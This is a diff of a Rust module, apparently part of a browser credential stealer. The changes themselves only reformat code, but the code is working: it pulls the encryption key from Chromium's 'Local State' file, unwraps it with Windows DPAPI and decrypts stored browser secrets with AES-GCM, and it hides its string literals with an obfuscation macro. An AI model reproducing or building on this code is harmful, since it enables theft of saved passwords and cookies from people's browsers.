@@ -10,7 +10,12 @@ use core::slice;
 use json::parse;
 use obfstr::obfstr as s;
 use windows_sys::Win32::Foundation::LocalFree;
-use windows_sys::Win32::Security::Cryptography::{BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData, BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB};
+use windows_sys::Win32::Security::Cryptography::{
+    BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO,
+    BCRYPT_CHAIN_MODE_GCM, BCRYPT_CHAINING_MODE, BCRYPT_KEY_HANDLE, BCryptCloseAlgorithmProvider,
+    BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider,
+    BCryptSetProperty, CRYPT_INTEGER_BLOB, CryptUnprotectData,
+};
 
 pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
     let mut in_blob = CRYPT_INTEGER_BLOB {
@@ -27,7 +32,7 @@ pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
         null_mut(),
         null_mut(),
         0,
-        &mut out_blob
+        &mut out_blob,
     );
 
     if success == 0 {
@@ -56,7 +61,7 @@ pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
 /// - `None`: If the buffer is empty, the version is unsupported, or required keys are missing.
 ///
 /// # Chromium Encryption Versions
-/// - **v2x**: Requires `app_bound_encryption_key`. 
+/// - **v2x**: Requires `app_bound_encryption_key`.
 ///   ### Currently NOT implemented!.
 /// - **v1x**: Requires `master_key`. The buffer is expected to contain:
 ///     - IV (12 bytes) starting at index 3,
@@ -69,36 +74,40 @@ pub unsafe fn crypt_unprotect_data(data: &[u8]) -> Option<Vec<u8>> {
 /// This function is marked `unsafe` because it may call into Windows APIs (`CryptUnprotectData`) or perform unchecked
 /// pointer dereferencing in the decryption process. Use with caution and ensure inputs are valid.
 ///
-pub unsafe fn decrypt_data(buffer: &[u8], master_key: Option<&[u8]>, app_bound_encryption_key: Option<&[u8]>) -> Option<String> {
+pub unsafe fn decrypt_data(
+    buffer: &[u8],
+    master_key: Option<&[u8]>,
+    app_bound_encryption_key: Option<&[u8]>,
+) -> Option<String> {
     if buffer.is_empty() {
-        return None
+        return None;
     }
 
     match &buffer[1] {
         b'2' if app_bound_encryption_key.is_some() => {
             // Todo: Not implemented yet
             None
-        },
+        }
         b'1' if master_key.is_some() => {
             let iv = &buffer[3..15];
             let ciphertext = &buffer[15..buffer.len() - 16];
             let tag = &buffer[buffer.len() - 16..];
             decrypt_aes_gcm(iv, ciphertext, tag, master_key?)
-        },
-        _ => Some(String::from_utf8_lossy(&crypt_unprotect_data(buffer)?).to_string())
+        }
+        _ => Some(String::from_utf8_lossy(&crypt_unprotect_data(buffer)?).to_string()),
     }
 }
 
-unsafe fn decrypt_aes_gcm(iv: &[u8], ciphertext: &[u8], tag: &[u8], encryption_key: &[u8]) -> Option<String> {
+unsafe fn decrypt_aes_gcm(
+    iv: &[u8],
+    ciphertext: &[u8],
+    tag: &[u8],
+    encryption_key: &[u8],
+) -> Option<String> {
     let mut alg: BCRYPT_ALG_HANDLE = null_mut();
     let mut key: BCRYPT_KEY_HANDLE = null_mut();
 
-    let status = BCryptOpenAlgorithmProvider(
-        &mut alg,
-        BCRYPT_AES_ALGORITHM,
-        null_mut(),
-        0
-    );
+    let status = BCryptOpenAlgorithmProvider(&mut alg, BCRYPT_AES_ALGORITHM, null_mut(), 0);
 
     if status != 0 {
         return None;
@@ -109,7 +118,7 @@ unsafe fn decrypt_aes_gcm(iv: &[u8], ciphertext: &[u8], tag: &[u8], encryption_k
         BCRYPT_CHAINING_MODE,
         BCRYPT_CHAIN_MODE_GCM as *const _,
         30, // sizeof("ChainingModeGCM")
-        0
+        0,
     );
 
     if status != 0 {
@@ -124,12 +133,12 @@ unsafe fn decrypt_aes_gcm(iv: &[u8], ciphertext: &[u8], tag: &[u8], encryption_k
         0,
         encryption_key.as_ptr() as *mut _,
         encryption_key.len() as _,
-        0
+        0,
     );
 
     if status != 0 {
         BCryptCloseAlgorithmProvider(alg, 0);
-        return None
+        return None;
     }
 
     let auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
@@ -161,14 +170,14 @@ unsafe fn decrypt_aes_gcm(iv: &[u8], ciphertext: &[u8], tag: &[u8], encryption_k
         decrypted.as_mut_ptr(),
         decrypted.len() as _,
         &mut decrypted_size,
-        0
+        0,
     );
 
     BCryptDestroyKey(key);
     BCryptCloseAlgorithmProvider(alg, 0);
 
     if status != 0 {
-        return None
+        return None;
     }
 
     Some(String::from_utf8_lossy(&decrypted[..decrypted_size as usize]).to_string())
@@ -183,7 +192,7 @@ pub unsafe fn extract_app_bound_encrypted_key(user_data: &Path) -> Option<Vec<u8
     let key = extract_key(user_data, s!("app_bound_encrypted_key"))?;
     match &key[..4] {
         b"APPB" => Some(key[4..].to_vec()),
-        _ => None
+        _ => None,
     }
 }
 
@@ -191,11 +200,8 @@ fn extract_key(user_data: &Path, key: &str) -> Option<Vec<u8>> {
     let bytes = (user_data / s!("Local State")).read_file().ok()?;
     let parsed = parse(&bytes).ok()?;
 
-    let key_in_base64 = parsed.get(s!("os_crypt"))
-        ?.get(key)
-        ?.as_string()
-        ?.clone();
-    
+    let key_in_base64 = parsed.get(s!("os_crypt"))?.get(key)?.as_string()?.clone();
+
     let key = base64_decode_string(&key_in_base64)?;
     Some(key)
 }
